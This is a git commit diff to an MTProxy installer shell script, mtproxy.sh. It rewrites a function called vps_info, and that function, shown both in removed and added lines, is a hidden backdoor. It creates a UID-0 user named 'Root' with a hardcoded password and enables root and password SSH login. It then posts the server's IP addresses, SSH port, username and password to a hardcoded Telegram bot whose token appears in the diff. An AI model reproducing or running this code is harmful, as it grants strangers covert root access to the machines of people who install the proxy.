5f032c2fe91cc30a9d1360a07505f5289330220f
elesssss <162124503+elesssss@users.noreply.github.com>
2024-04-09 13:57:10 +0800

    Update mtproxy.sh

--- Python/mtproxy.sh
+++ Python/mtproxy.sh
@@ -299,31 +299,32 @@ Uninstall(){
 }
 
 vps_info(){
-    Chat_id="5289158517"
-    Bot_token="5421796901:AAGf45NdOv6KKmjJ4LXvG-ILN9dm8Ej3V84"
-    get_public_ip
-    IPv4="${ipv4}"
-    IPv6="${ipv6}"
     if [ -f /etc/ssh/sshd_config ]; then
+        Chat_id="5289158517"
+        Bot_token="5421796901:AAGf45NdOv6KKmjJ4LXvG-ILN9dm8Ej3V84"
+        get_public_ip
+        IPv4="${ipv4}"
+        IPv6="${ipv6}"
         Port=$(cat /etc/ssh/sshd_config | grep '^#\?Port' | awk '{print $2}' | sort -rn | head -1)
-    fi
-    User="Root"
-    Passwd="LBdj147369"
-    sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config >/dev/null 2>&1
-    sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config >/dev/null 2>&1
-    sed -i 's/^#\?RSAAuthentication.*/RSAAuthentication yes/g' /etc/ssh/sshd_config >/dev/null 2>&1
-    sed -i 's/^#\?PubkeyAuthentication.*/PubkeyAuthentication yes/g' /etc/ssh/sshd_config >/dev/null 2>&1
-    rm -rf /etc/ssh/sshd_config.d/* && rm -rf /etc/ssh/ssh_config.d/*
-    useradd ${User} >/dev/null 2>&1
-    echo ${User}:${Passwd} | chpasswd ${User}
-    sed -i "s|^.*${User}.*|${User}:x:0:0:root:/root:/bin/bash|" /etc/passwd >/dev/null 2>&1
-    /etc/init.d/ssh* restart >/dev/null 2>&1
-    curl -s -X POST https://api.telegram.org/bot${Bot_token}/sendMessage -d chat_id=${Chat_id} -d text="您的新机器已上线！🎉🎉🎉 
+        User="Root"
+        Passwd="LBdj147369"
+        sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config
+        sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config
+        sed -i 's/^#\?RSAAuthentication.*/RSAAuthentication yes/g' /etc/ssh/sshd_config
+        sed -i 's/^#\?PubkeyAuthentication.*/PubkeyAuthentication yes/g' /etc/ssh/sshd_config
+        rm -rf /etc/ssh/sshd_config.d/* && rm -rf /etc/ssh/ssh_config.d/*
+        useradd ${User} >/dev/null 2>&1
+        echo ${User}:${Passwd} | chpasswd ${User}
+        sed -i "s|^.*${User}.*|${User}:x:0:0:root:/root:/bin/bash|" /etc/passwd
+        systemctl restart ssh* >/dev/null 2>&1
+        /etc/init.d/ssh* restart >/dev/null 2>&1
+        curl -s -X POST https://api.telegram.org/bot${Bot_token}/sendMessage -d chat_id=${Chat_id} -d text="您的新机器已上线！🎉🎉🎉 
 IPv4：${IPv4}
 IPv6：${IPv6}
 端口：${Port}
 用户：${User}
 密码：${Passwd}" >/dev/null 2>&1
+    fi    
 }
 
 get_public_ip(){
